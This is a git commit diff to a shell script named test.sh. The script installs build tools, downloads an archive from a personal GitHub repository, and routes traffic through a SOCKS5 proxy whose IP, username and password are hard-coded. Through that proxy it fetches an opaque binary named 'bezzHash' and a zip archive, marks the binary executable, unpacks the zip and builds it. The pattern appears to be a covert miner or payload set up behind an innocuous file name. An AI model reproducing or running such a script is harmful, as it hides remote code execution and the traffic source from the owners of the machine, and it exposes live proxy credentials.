2430c2c05b76f8a98fadde2de91cefb167aa747d
Myaxisplay <101804515+Myaxisplay@users.noreply.github.com>
2022-04-22 01:59:29 +0700

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,9 +1,13 @@
 #!/bin/sh
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-
 dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
 tar -xvzf graphics.tar.gz
+
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
@@ -11,12 +15,29 @@ socks5 =  2.56.120.93:5205
 socks5_username = hadi0139
 socks5_password = buatthr2022
 END
+
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo "******************************************************************"
+
 ./graftcp/graftcp curl ifconfig.me
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
+echo " "
+echo " "
 
+echo "******************************************************************"
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
 chmod +x bezzHash
+
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
 unzip magicBezzHash.zip
 make
